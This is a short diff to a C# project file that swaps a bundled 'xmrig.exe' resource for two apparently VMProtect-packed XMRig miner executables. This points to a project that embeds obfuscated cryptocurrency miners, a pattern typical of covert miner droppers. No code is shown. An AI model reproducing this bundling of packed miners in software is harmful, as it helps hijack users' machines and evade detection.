@@ -110,7 +110,10 @@
     </EmbeddedResource>
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\xmrig.exe" />
+    <None Include="Resources\xmrig-amd.vmp.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\xmrig.vmp.exe" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
